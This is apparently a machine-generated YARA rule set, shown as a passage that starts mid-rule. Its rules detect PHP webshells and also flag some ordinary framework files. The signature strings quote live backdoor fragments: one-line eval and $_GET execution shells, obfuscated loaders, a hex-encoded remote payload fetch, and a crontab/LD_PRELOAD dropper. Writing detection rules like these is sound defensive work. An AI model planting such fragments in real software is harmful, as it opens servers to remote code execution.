      $s9 = "0bLOuzvpOB//MLaQ6tEkAltQyAzQJfXrdTRERLMOithyu0bpjCiqmYQcEUMm57U7n0KDCRjaspa7QWuw" fullword ascii
      $s10 = "DKr+O9Mt//keQoB8mOPB1ilgR3loL8kqj83WDkW+WP7gN3uskAbPWWGXiixwpHrJah3Kd2vIMf9TzI1r" fullword ascii
      $s11 = "fBmQADnt5Bxxxu5hp5R6Mqplsz5qwK7DO99TWh4Lv9Vsp3FcfGxZbyF158XK2Wss//G8Y97gFBd1ajSu" fullword ascii
      $s12 = "();}} @header(\"Status: 404 Not Found\"); ?>" fullword ascii
      $s13 = "V2AWcUT648zr082x/LCV3jfp/r/Vr4pBCRSm3IXaWY12kX+3vcupnqoWb5ka5NseIASZI4NbJuIGy+J0" fullword ascii
      $s14 = "77DXqGQgvKYptsaF5yrsacbizFqnzu5CoFad/ncs2mSVgUQSoEHaJFNq/llkmhcNTNkb0M4XOa1eZg/A" fullword ascii
      $s15 = "JTB4lcGri7Sl5a894r1dxSf45mIXKkQtv4IWuEvNOnfaUdKpGpPJ1PbeXCYuOAIJ/+/qvLixobhJJXWp" fullword ascii
      $s16 = "ddkrf2keHLIOl0yGUnnoIU0+uMoRT7FlmczLrBjfnK7H7fPbF+osT0sS0OiYsiJke3CQZeN4tF7/Hz/D" fullword ascii
      $s17 = "zuyReem7yMDvnZR/ubWraN4TsDbbCgwJLkD49tfhqs4bajEnQok3rxPn7zMTqrIBs/e/rrHZwiTNam4e" fullword ascii
      $s18 = "17j0tvLy8/3dJ6hjRmgKQbRhQR0XRhqCjaTKeft8/fFRPHQv2jwf5i90n8yE3JAeqEA/yurpdnnrnL/u" fullword ascii
      $s19 = "vI+qaDbg4PyChsTJ5bfeHgcmiYvzo/I/+ZTDGRV74NPrc/Gw2CkITPrcpPgteNmkqr0MdxNcbZF7GNMR" fullword ascii
      $s20 = "dpSl+Rs77ZPDMjrVBlcgRXyJnrSfv4zlnuHpqTXNLhTZZzrIREzFWkvNN93bc1w50wOei4Ak7pXWkR/M" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule php17_77
{
   meta:
      description = "php17 - file 77.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a76ded6353f34bf5ddc45432e1ee8da5579efa6a49653e8565bb61f0c77c8b56"
   strings:
      $x1 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$b374k=@$s_func('$x,$y','ev'.'al'.'(\"\\$s_pass=\\\"$y\\\";?>\".gz'.'inf'.'late'" ascii
      $s2 = "3h8eWDs1dpXQcvuNRq7B/5WbWqufzZ7ChaTD0dHR7dn7dr6PlmWwdp0c//2wP+86TRMvzGzdBQs9DeHjc87h9NLtdnq2vb2rjlxNbG+BF7rLw8Pps8mdqZPJi7uHs+7R" ascii
      $s3 = "VdPv+SX6ZgAb7npF30OrTqzYWjSZ3KZQuHbENcE9XAnpypr6U2mbMGWU0ZICphdSFa9rEDQCR5lSX5xjW1HMut4C3NG0kcz/5/KDktZl+WqcjH81t4A8QCuSfeT6FtPF" ascii
      $s4 = "VVQtJv/YrXmO3aGEtm8R7kmys+HflAGZWQMCKWkuPbgs5BphTLGXTL/H1XvcDvWBH9AlpMpFTOl+HmPbo6Rp7FphE8ux7H7J1kthJckP8VdtsgTqjzmvkEORJZS2FGew" ascii
      $s5 = "3tLzblpe+HCC5fsvWZ76suMYy/WrP3Nu9PL7kH/4vxrrdptzPj9TdNtdIbr2/5i7erxcdvebK2d7UaX7rG7Pz8029b2+f7cmbF1dtfofG4Mp5ubV83Z+cMd+9S6HGxNt" ascii
      $s6 = "NWYfBwhjGTk2g+VG4Dw+gKOkFj8UJszAPLzNcoyq4lWR1BfVpnh7xeoohOARpv1PbdkoqYrJuKM6gqRcEQLYy8fDim5fiRc6SLCxzqhdrndOGloQ/Z4sXBeGH9RqU3R7" ascii
      $s7 = "00hdH15aBAURy3SHMdSrbRD3FF6KW+pCKIh4jITqGsQ5G1F36FenqOr+O/9DwEyJYJP7m7cKUGfdLL6dEU+IUGG8Jo4C6+qqR/5sHfJGi8fU8/TeBeN0RdGPKYdEV+y6" ascii
      $s8 = "q0K4OqIpa/IRcFS4pEy4sPGPy71HqMJgcpZmxgmG9O1Za1SVROpHCvcE/DUsqZWJJuNnjGDct7PVC4dX5qTsmIfOedgmMyeWSoBgOkh61orfvvvH98nSj+qjl5mc4dW2" ascii
      $s9 = "7+kX+FIDOzYg/2FP99ki+We9nFi8zLYb3jle2JH0zkLM9e9sqGKxLbuFkqv/lTTr5EI4A+mekBGGmlOGjJNTnJTEGKgdoxL7xOcH/eSCreQIij/hi66DwmXfW0IEcnia" ascii
      $s10 = "Dl1JYSyZ2KX1F+jVZmkSz6R/TaK4Q2EDiZmEBUwQmgEwncdUO65nBR1f4BIfy8ImYIU+BrcCJBMe8EyEMJ9ERGpSeMiGq1V3qTqQHHEUDbgiNJEqZ4mBkbA71TVW4Wwo" ascii
      $s11 = "lJHbL5B8vcKjCniQDL0D0Z6jZhWXa/4LsXgqVTRCys0EyE43yu6phMo5J8PVQMpng2QmIK+SkedkBJFFK+xTtR1Q982HcMljDTA7LI2rf2tTal1gz7Ji4K4qrRZQTqQH" ascii
      $s12 = "zYKf6hl3UMFRGp2LSWmGO6BHLWphrBiAJFB6YbrkxN9u0eNhlRRXWD1ZTpzGGIvqIV8up71j/LzC12AXSpYHQCqhUH8XNtgUg3kfjyeBb4rxNv4ltueBek4aPsg830wi" ascii
      $s13 = "AY+VB3o8Qq0QL+xFKn26PUDEaBAaZNeIpzIECddbfJBm/THgETR8UchzNu6sYNAetwaNsGdUZ19G+Zdwi4TC3zT4S8Y26IYvwaVTju2675MgqcPIbnULpok0MnfGPqJD" ascii
      $s14 = "j2ig+39rK0beuwGiKF5YvMZ1uOIaLABQQB6dbpA4Td7nldi6r1BbtaN93oY8D+up8pqkjafpr7Lk2GNRMV64C3ZWYTJMNrZrAaq2jwEnzgdRcZh+Mf/FZRnbiRcpjceY" ascii
      $s15 = "Cof8KZnPa7oyjmdrkc8pruxYig51ZShM2ZGU+BKyh/0HasIzIEOE4XG7ngoMcll20GblaVZcllaGembMp0C/C18JwNOiY91s208GoWV9x+qkIiTQyHx4ul1QSbM4iMJL" ascii
      $s16 = "vwiG6Ff1MkK6gcuric6oaTEezkRKykt0J7KLQC6WMfuxXUSlcgEtSSeQTl5C3i4rhJ9sufyDofdIMNZpgDI34JeIn9vkBYjtcnUICb6lSzf8yLgb6HM2SzngezphNfXC" ascii
      $s17 = "HRjaLte/EhoGetrzFvOm2Mu7i34+y1zBf/ZsAi+TpmAuNxwnzTs5YIJjjQte1WrArhAXnUHsYxXrZi6jDXw0lW9fgZsS9hzxPTE5rhQ82os4XjTkNko7qlTqUDofjhlH" ascii
      $s18 = "D8g9jmm9a6ujAuT92QX9ncRujbxGQMtYwniOnH4zITOVfZcyl9nxkvV/xpFeY0U26d8GYzAJ977AfxeoSAgJSXH0HOST73M004iShfMk1+R9JO/Jh7sK5+1bE+W0BGOr" ascii
      $s19 = "JCmTeI2E0NfeQXwmChSbQz8SZ4Xt/GCFlRKSVzq8wsWWE6M+8CyhHVkE7HioaifNfaP4KydlTUqZ2PnRJeIjTdEKDrq+jouNahCf1fZiThduiIXrej0zlP0Ce+hLfXo+" ascii
      $s20 = "rhZ3dg4YU+jhE9hWOHxBoyuMXDrtQMXAyH0m3g/Cn4VxMct3r63TfTLBybe4sPkD2DLL3GBBTyBeg6JhQmOELA6xAi/qJsM+tXDMCE6Rwq/wc8D/eC+qBle+AkOFOgHf" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_06964dce9addb1c5cb5d6e3d9838f733
{
   meta:
      description = "php17 - file 06964dce9addb1c5cb5d6e3d9838f733.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e572db25a8b68d8eeae168e4363006d752f08de169b7ce91156d0e86d9ec798f"
   strings:
      $x1 = "* Dung` de login vao` CSDL cua victim khi da biet user va` pass cua mysql thong qua file config" fullword ascii
      $x2 = "passthru( $bindir.\"mysqldump --user=$USERNAME --password=$PASSWORD $dbname $tablename\" );" fullword ascii
      $x3 = "echo \"<li><a href='$PHP_SELF?action=utils&command=show_processlist'>Processlist</a>\\n\";" fullword ascii
      $s4 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_logs'>Logs</a>\\n\";" fullword ascii
      $s5 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_privileges'>Privileges</a>\\n\";" fullword ascii
      $s6 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_hosts'>Hosts</a>\\n\";" fullword ascii
      $s7 = "$mysqlHandle = mysql_pconnect( $HOSTNAME, $USERNAME, $PASSWORD );" fullword ascii
      $s8 = "echo \"<a href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>\\n\";" fullword ascii
      $s9 = "header(\"Content-disposition: filename=$filename.sql\");" fullword ascii
      $s10 = "echo \"<td><a href='$PHP_SELF?action=dumpDB&dbname=$dbname'>Dump</a></td>\\n\";" fullword ascii
      $s11 = "$M, $D, $unsigned, $zerofill, $binary, $not_null, $default_value, $auto_increment, $primary_key, $valuelist;" fullword ascii
      $s12 = "$pResult = mysql_query( $queryStr =  \"SELECT * FROM $tablename WHERE $key\", $mysqlHandle );" fullword ascii
      $s13 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_tables'>Tables</a>\\n\";" fullword ascii
      $s14 = "echo \"<li><a href='$PHP_SELF?action=utils&command=show_variables'>Variables</a>\\n\";" fullword ascii
      $s15 = "echo \"<li><a href='$PHP_SELF?action=utils&command=show_status'>Status</a>\\n\";" fullword ascii
      $s16 = "echo \"<tr><td>Password </td><td> <input type=password name=password></td></tr>\\n\";" fullword ascii
      $s17 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_status'>Status</a>\\n\";" fullword ascii
      $s18 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword ascii
      $s19 = "if( $command == \"flush_logs\" ) {" fullword ascii
      $s20 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule AppDownCommand
{
   meta:
      description = "php17 - file AppDownCommand.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8d7488d02c77399b73b584a72af9b636e23acd8996054f68b181b67c516d2d62"
   strings:
      $x1 = "if (file_put_contents(Config::get('paths', 'tmp.framework.http') . '/down', 'down') === false) {" fullword ascii
      $s2 = "* @license   https://github.com/opulencephp/Opulence/blob/master/LICENSE.md" fullword ascii
      $s3 = "* @link      https://www.opulencephp.com" fullword ascii
      $s4 = "protected function doExecute(IResponse $response)" fullword ascii
      $s5 = "namespace Opulence\\Framework\\Console\\Commands;" fullword ascii
      $s6 = "* Defines the application-down command" fullword ascii
      $s7 = "* @copyright Copyright (C) 2017 David Young" fullword ascii
      $s8 = "use Opulence\\Console\\Commands\\Command;" fullword ascii
      $s9 = "use Opulence\\Framework\\Configuration\\Config;" fullword ascii
      $s10 = "class AppDownCommand extends Command" fullword ascii
      $s11 = "$response->writeln('<error>Failed to put application into maintenance mode</error>');" fullword ascii
      $s12 = "* Opulence" fullword ascii
      $s13 = "->setDescription('Puts the application into maintenance mode');" fullword ascii
      $s14 = "$response->writeln('<success>Application in maintenance mode</success>');" fullword ascii
      $s15 = "use Opulence\\Console\\Responses\\IResponse;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule sig_78533f2ce746e383192b05a97ab84813
{
   meta:
      description = "php17 - file 78533f2ce746e383192b05a97ab84813.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4b60f56db6446f7f775346a754402cdfc632118ff578f50e297f4a7b5a5816a2"
   strings:
      $s1 = "687474703a2f2f626c616b696e2e64756170702e636f6d2f7631" ascii
      $s2 = "//http://require.duapp.com/session.php" fullword ascii
      $s3 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSION['t']))));" fullword ascii
      $s4 = "'f' => $i('c*', 102, 105, 108, 101, 95, 103, 101, 116, 95, 99, 111, 110, 116, 101, 110, 116, 115)," fullword ascii
      $s5 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword ascii
      $s6 = "'e' => $i('c*',0x63,0x72,0x65,0x61,0x74,0x65,0x5f,0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e)," fullword ascii
      $s7 = "'c' => $i('c*', 99, 97, 108, 108, 95, 117, 115, 101, 114, 95, 102, 117, 110, 99)," fullword ascii
      $s8 = "'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword ascii
      $s9 = "'s' =>$i('c*',0x73,0x70,0x72,0x69,0x6e,0x74,0x66)" fullword ascii
      $s10 = "//define('pass','123456');" fullword ascii
      $s11 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword ascii
      $s12 = "'p' => pack('c*', 0x70, 0x61, 99, 107)," fullword ascii
      $s13 = "//**********************************" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_2204a27f97b3789473046d288a01c49084b768c0
{
   meta:
      description = "php17 - file 2204a27f97b3789473046d288a01c49084b768c0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e74355d14e406759b00c2f3156b559c8fac1d2266eb072112fbe5069ba7bc0e"
   strings:
      $s1 = "@system(\"(crontab -l|grep -v crontab;echo;echo '* * * * * \".$SCP.\"/1.sh')|crontab\", $ret);" fullword ascii
      $s2 = "print \"SO dumped \".file_put_contents(\"./libworker.so\", $so).\"\\n\";" fullword ascii
      $s3 = "@system(\"killall -9 \".basename(\"/usr/bin/host\"));" fullword ascii
      $s4 = "$SCR .=\"crontab -l|grep -v '1\\.sh'|grep -v crontab|crontab\\nfi\\nrm 1.sh\\nexit 0\\n\";" fullword ascii
      $s5 = "$SCR  =\"#!/bin/sh\\ncd '\".$SCP.\"'\\nif [ -f './libworker.so' ];then killall -9 $HBN;export AU='\".$AU.\"'\\nexport LD_PRELOAD" ascii
      $s6 = "$sF=\"PCT4BA6ODSE_\";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$s" fullword ascii
      $s7 = "@system(\"at now -f 1.sh\", $ret);" fullword ascii
      $s8 = "F[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n3b9afc'];if(isset($s22)){eval($s21($s22));}?><?php" fullword ascii
      $s9 = "$SCR  =\"#!/bin/sh\\ncd '\".$SCP.\"'\\nif [ -f './libworker.so' ];then killall -9 $HBN;export AU='\".$AU.\"'\\nexport LD_PRELOAD" ascii
      $s10 = "rker.so\\n/usr/bin/host\\nunset LD_PRELOAD\\n\";" fullword ascii
      $s11 = "$HBN=basename(\"/usr/bin/host\");" fullword ascii
      $s12 = "$f = fopen(\"/usr/bin/host\", \"rb\");" fullword ascii
      $s13 = "/* try at now, file will be removed, crontab cleaned on success */" fullword ascii
      $s14 = "print \"System is \".($n[8] == 9 ? \"FreeBSD\" : \"Linux\").\"\\n\";" fullword ascii
      $s15 = "function file_put_contents($filename, $data) {" fullword ascii
      $s16 = "if (! function_exists('file_put_contents')) {" fullword ascii
      $s17 = "@file_put_contents(\"1.sh\", $SCR);" fullword ascii
      $s18 = "/* second stage dropper */" fullword ascii
      $s19 = "if (getenv(\"MAYHEM_DEBUG\"))" fullword ascii
      $s20 = "$n = unpack(\"C*\", fread($f, 8));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      8 of them
}

rule sig_261ad026bdf4319ae0ad1f03beb4d823aad734aa
{
   meta:
      description = "php17 - file 261ad026bdf4319ae0ad1f03beb4d823aad734aa.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c4bfc3d39c1d01fa01b2100f1e1c8a58e74a2164fe6fae3c320d23ca3682e058"
   strings:
      $s1 = "<?php @eval($_POST['password']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_487c92b3a3c652d44000c04199f283f0c7b6da49
{
   meta:
      description = "php17 - file 487c92b3a3c652d44000c04199f283f0c7b6da49.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "edc4d47df6bed71292d9123f22f372590e12a547d224e54122c90c5d2622d421"
   strings:
      $x1 = "eval(base64_decode('aWYocHJlZ19tYXRjaCgiL2JvdC8iLCAkX1NFUlZFUltIVFRQX1VTRVJfQUdFTlRdKSkge2hlYWRlcigiSFRUUC8xLjAgNDA0Iik7ZXhpdCgi" ascii
      $s2 = "aG8gc3IoMjUsIjxiPiIuJGxhbmdbJGxhbmd1YWdlLidfdGV4dDg5J10uJGFycm93LiI8L2I+IixpbigndGV4dCcsJ2Z0cF9maWxlJywyMCwoIWVtcHR5KCRfUE9TVFsn" ascii
      $s3 = "PiIuJGxhbmdbJGxhbmd1YWdlLidfdGV4dDY4J10uJGFycm93LiI8L2I+Ii4iPHNlbGVjdCBuYW1lPXdoYXQ+Ii4kc2VsZWN0LiI8L3NlbGVjdD4iLndzKDQpLmluKCd0" ascii
      $s4 = "VmVyZGFuYSBzaXplPS0yPiIuJGxhbmdbJGxhbmd1YWdlLidfdGV4dDk5J10uIiAoIDxhIGhyZWY9JyIuJF9TRVJWRVJbJ1BIUF9TRUxGJ10uIj91c2Vycyc+Ii4kbGFu" ascii
      $s5 = "c3IoMTUsIjxiPiIuJGxhbmdbJGxhbmd1YWdlLidfdGV4dDQnXS4kYXJyb3cuIjwvYj4iLGluKCd0ZXh0JywnZGlyJyw5NiwoIWVtcHR5KCRfUE9TVFsndGVzdF9nbG9i" ascii
      $s6 = "bmd1YWdlLidfdGV4dDQzJ10uJGFycm93LiI8L2I+IixpbigndGV4dCcsJ2VfbmFtZScsODUsJGRpcikuaW4oJ2hpZGRlbicsJ2NtZCcsMCwnZWRpdF9maWxlJykuaW4o" ascii
      $s7 = "ZXh0NzQnXS4kYXJyb3cuIjwvYj4iLGluKCd0ZXh0Jywnc19tYXNrJyw4NSwnKi5baGNdJykud3MoMSkuJGxhbmdbJGxhbmd1YWdlLidfdGV4dDc1J10uaW4oJ2hpZGRl" ascii
      $s8 = "ZCBiZ2NvbG9yPSNjY2NjY2M+PGZvbnQgY29sb3I9cmVkIGZhY2U9VmVyZGFuYSBzaXplPS0yPjxkaXYgYWxpZ249Y2VudGVyPjxiPiIuJGxhbmdbJGxhbmd1YWdlLidf" ascii
      $s9 = "JGxhbmdbJGxhbmd1YWdlLidfdGV4dDEzJ10uJGFycm93LiI8L2I+IixpbigndGV4dCcsJ2lwJywxNSwoKGdldGVudignUkVNT1RFX0FERFInKSkgPyAoZ2V0ZW52KCdS" ascii
      $s10 = "ZW4nLCdkaXInLDAsJGRpcikud3MoMikuIjxiPiIuJGxhbmdbJGxhbmd1YWdlLidfdGV4dDE3J10uJGFycm93LiI8L2I+Ii5pbigndGV4dCcsJ3JlbV9maWxlJyw3OCwn" ascii
      $s11 = "Y2NjY2NjPjxkaXYgYWxpZ249Y2VudGVyPjxmb250IGZhY2U9VmVyZGFuYSBzaXplPS0yPjxiPiIuJGxhbmdbJGxhbmd1YWdlLidfdGV4dDY0J10uIjwvYj48L2ZvbnQ+" ascii
      $s12 = "bmdbJGxhbmd1YWdlLidfdGV4dDEwNSddLiRhcnJvdy4iPC9iPiIsaW4oJ3RleHQnLCd0bycsMzAsKCFlbXB0eSgkX1BPU1RbJ3RvJ10pPygkX1BPU1RbJ3RvJ10pOigi" ascii
      $s13 = "YWdlLidfdGV4dDEwNSddLiRhcnJvdy4iPC9iPiIsaW4oJ3RleHQnLCd0bycsMzAsKCFlbXB0eSgkX1BPU1RbJ3RvJ10pPygkX1BPU1RbJ3RvJ10pOigiaGFja2VyQG1h" ascii
      $s14 = "MTE3J10ud3MoMikuJGxhbmdbJGxhbmd1YWdlLidfdGV4dDYwJ10uJGFycm93LiI8L2I+IixpbigndGV4dCcsJ3Rlc3Q4X2ZpbGUyJyw5NiwoIWVtcHR5KCRfUE9TVFsn" ascii
      $s15 = "c3QxOV9tZCddKTooIm15c3FsaSIpKSkud3MoNCkuIjxiPiIuJGxhbmdbJGxhbmd1YWdlLidfdGV4dDM3J10uJGFycm93LiI8L2I+Ii5pbigndGV4dCcsJ3Rlc3QxOV9t" ascii
      $s16 = "IWVtcHR5KCRfUE9TVFsndGVzdDNfbWQnXSk/KCRfUE9TVFsndGVzdDNfbWQnXSk6KCJteXNxbCIpKSkud3MoNCkuIjxiPiIuJGxhbmdbJGxhbmd1YWdlLidfdGV4dDM3" ascii
      $s17 = "bmdbJGxhbmd1YWdlLidfdGV4dDEwNiddLiRhcnJvdy4iPC9iPiIsaW4oJ3RleHQnLCdmcm9tJywzMCwoIWVtcHR5KCRfUE9TVFsnZnJvbSddKT8oJF9QT1NUWydmcm9t" ascii
      $s18 = "dmFsdWU9ZGVsZXRlPiIuJGxhbmdbJGxhbmd1YWdlLidfdGV4dDY2J10uIjwvb3B0aW9uPjwvc2VsZWN0PiIud3MoMykuIjxzZWxlY3QgbmFtZT13aGF0PjxvcHRpb24g" ascii
      $s19 = "cicsMCwkZGlyKS5pbignaGlkZGVuJywnY21kJywwLCd0ZXN0MTdfMScpLmluKCdzdWJtaXQnLCdzdWJtaXQnLDAsJGxhbmdbJGxhbmd1YWdlLidfdGV4dDEzNiddKS4k" ascii
      $s20 = "bmdbJGxhbmd1YWdlLidfdGV4dDEwOCddLiRhcnJvdy4iPC9iPiIsJzx0ZXh0YXJlYSBuYW1lPXRleHQgY29scz0yMiByb3dzPTI+Jy4oIWVtcHR5KCRfUE9TVFsndGV4" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule a84551b9fd24d6b5e98709467e9f1b6d735a9ce8
{
   meta:
      description = "php17 - file a84551b9fd24d6b5e98709467e9f1b6d735a9ce8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2e360724d1670b6c8e5f4ef51746d33f23dd182e5cb0da7c40ae1004daa5cf89"
   strings:
      $s1 = "$_GET[a]($_GET[b]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2_4_user_country_iso
{
   meta:
      description = "php17 - file 2.4-user-country-iso.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "df9cb1bc846cc581f3fe8eb99754eb7d49dcabcb7cf45577d2e1548273c87507"
   strings:
      $x1 = "* Common upgrade script for 2.4 User Profile country name to ISO code conversion" fullword ascii
      $s2 = "$list = $modx->runProcessor('system/country/getlist');" fullword ascii
      $s3 = "// Ensure valid ISO code exists for conversion (e.g skip numeric legacy keys)" fullword ascii
      $s4 = "$countries = $modx->fromJSON($list->getResponse());" fullword ascii
      $s5 = "'<br /><small>'.$updateCount.' '.strtolower($modx->lexicon('updated')).'</small></p>'" fullword ascii
      $s6 = "* @var modX $modx" fullword ascii
      $s7 = "* @package setup" fullword ascii
      $s8 = "modInstallRunner::RESULT_SUCCESS," fullword ascii
      $s9 = "$this->runner->addResult(" fullword ascii
      $s10 = "array('country' => strtoupper($country['iso']))," fullword ascii
      $s11 = "if (is_int($country['iso']) === false) {" fullword ascii
      $s12 = "$updateCount += $modx->updateCollection(" fullword ascii
      $s13 = "foreach ($countries['results'] as $country) {" fullword ascii
      $s14 = "'modUserProfile'," fullword ascii
      $s15 = "'<p class=\"ok\">'.$this->install->lexicon('iso_country_code_converted')." fullword ascii
      $s16 = "array('country' => $country['country'])" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule AbstractManager
{
   meta:
      description = "php17 - file AbstractManager.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9154f090b0d1113307a5bf876f81bf33c11e12cfa45051d4470ad6cee280e93f"
   strings:
      $s1 = "return isset($this->messages[$identifier]) ? $this->messages[$identifier] : null;" fullword ascii
      $s2 = "public function getMessage($identifier)" fullword ascii
      $s3 = "namespace Concrete\\Core\\Application\\Service\\UserInterface\\Help;" fullword ascii
      $s4 = "public function setMessage($identifier, MessageInterface $message)" fullword ascii
      $s5 = "public function registerMessageString($identifier, $message)" fullword ascii
      $s6 = "public function getFormatter(Message $message)" fullword ascii
      $s7 = "$m->setMessageContent($message);" fullword ascii
      $s8 = "$this->registerMessageString($identifier, $message);" fullword ascii
      $s9 = "$m->setMessageContent($message[0]);" fullword ascii
      $s10 = "foreach ($messages as $identifier => $message) {" fullword ascii
      $s11 = "$this->messages[$identifier] = $message;" fullword ascii
      $s12 = "$this->setMessage($identifier, $m);" fullword ascii
      $s13 = "$m->setIdentifier($identifier);" fullword ascii
      $s14 = "public function registerMessages($messages)" fullword ascii
      $s15 = "class AbstractManager implements ManagerInterface, RegistryInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_2f3d11efd87175b77be940476f3904a8f98c98d4
{
   meta:
      description = "php17 - file 2f3d11efd87175b77be940476f3904a8f98c98d4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3cb697852852aaa681090c164d6c3bc6f7faa09b3ae768fdd89789e362cc0234"
   strings:
      $s1 = "<?php @preg_replace(\"//e\",$_POST[x],\"e\");exit(\"|LO|\"); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_020bf2c45e7bb322f89a226bd2c5d41b
{
   meta:
      description = "php17 - file 020bf2c45e7bb322f89a226bd2c5d41b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "679d5bff03cb626f7c3c3e108ea84cc83dfa79333c26155fb08d2de7d9f00840"
   strings:
      $s1 = "<?php  $auth_pass=\"\";$color=\"#df5\";$default_action=\"FilesMan\";$default_use_ajax=true;$default_charset=\"Windows-1251\";pre" ascii
      $s2 = "9KIlX5X5BysvX/dyp+nh8fYuaZCLPPaHNJugyiqGWcLzLx6eyRwif6fV8O6c7G2f7fHZhMJLnfx2GMpipebO8YcvlMiXhfwqm2IiUTmaQliiSf5tQfLsJDdeLbgtrZEY" ascii
      $s3 = "lNMqYbT3/tiHkbWdMsyjaeDCmfTImZlYPWrSkto4ST9GcMAPz7qe6CLOhlyrR+2i/IPxRDaMUWuo0yyQioDLlXI4VnmkO/i/ZlwmEKMyDxIAYUBypxtm1e9yWeH+ySRw" ascii
      $s4 = "3nLPQ82z56J+8JblyYLLBLFxCEowXhBLrWXJ3lLaND3ftjz6asy3vEgKYA9fGktRoeqy55EhL+s2TVR2P0CCBH4EDaRrXEwC3zzzg9PlwKmVY91G/GyKMZ8MUvbE88jI" ascii
      $s5 = "FxePq53MEElCBaFUcMY5g2CgAQ4koKAWMV+YOMioLxD18ET4h9IkSYhbAeU18cQBB72nm9IOdjXt1HgpPbGiIfwmRoFO5xevWdYdt+jqrkjwqB6Bbb2A+zoruBuF8Spy" ascii
      $s6 = "xPuZZyuXimnFRR1kAdXMm3b7tP3cd5RkmdhCqhScYDDbhqJ2UJdlLbxhrlxn5JzWr0nqNjBGobFAwHtAqllrL2tNZ1Tweu17zemMrDkdBhnRbQ9NosSUQaJ0IzlTt0qE" ascii
      $s7 = "bo0jCcZJXJ057mAIlHZJdMLMYe0OvgL4WvWcftR4PoHzgO+B6CpGcmL1enAgarA65EBuk7e19gwaK1uZT6FsO5SBinrudUUM8R2LkSJCDhdXn4NtfX0dUUA7kTdWe3Be" ascii
      $s8 = "liaAXjBzupgO+8oI/wZXwykarWPS8Crw/ejKhaXFdCckRIX0sz9DQgN3MnMDomToOl6P2kkey9CLAbYlHNO6BMwP+y+S7vZCqzfCwjbOnwHC3Lg9atUAdgf7iv+cYegU" ascii
      $s9 = "erITh/tLvQsBHGol75kaU/LwwYP4ZDjp0FcRY6Xhl3hvUOaKT8rGB4XV7E+nxx2YoqcHx0eQG1p9ZwTMSllb7thFV5WiicmdET3qyuIYbU4Agjc9lmCpzzk5MCOz70Hc" ascii
      $s10 = "Vri4Mr7JqlWmrcHju7XNTJIQpQVNXFyner+f+ciE9lHM1w0Y01lQbou0u4AoSspQMozgSgDyI0iriwxdb2NwZwah/VIMODKW9d/KzNTLmqWWvHnTvF1SmqHCBHI1pr9/" ascii
      $s11 = "ib/if0oGDtoVjpjVZt821qIhjVkvACEPeQknApoPxL3gh9gixcRCtiAgSce0oU//ggxsDWEpcauODllwUErFbFxe4iIoq6FmziM/npZIMRArUawR9RcsSUL6oRUmLYSo" ascii
      $s12 = "yDxVQiXDTJnc5Vhtxqehi3pzWhDlrREXBcwZZnFV5ERX5tNtUTw+9BlXxEULtRZ+LSnuKUhZoRjfNqWOeViTWp8QjgfAB7cMFQfBiEwLQNirca0IFzKF+SQOizYojv0B" ascii
      $s13 = "FE9x9c2O+ewgOzclMOmM0X8MUwgTWKtHGn25hYvel086UBjagzFIdGnRa7FeQYlnf58vYSXcQq5dLq2//AwRG5LksIvJeSQVETLvUU7AEF8NVZKIjfepub14Fj862sqR" ascii
      $s14 = "of/RdWan7l8gUCRSltol+0C8hlIrE8uEvEjRhN7CRYEpWWsK5l9qVc4kP8Vjoe5RKMtQDR+cYBTuYO/lKdDmdpo+OxF5XFjaVZH6Xlt15NJzwRCG92lMnFwTcFYo00FO" ascii
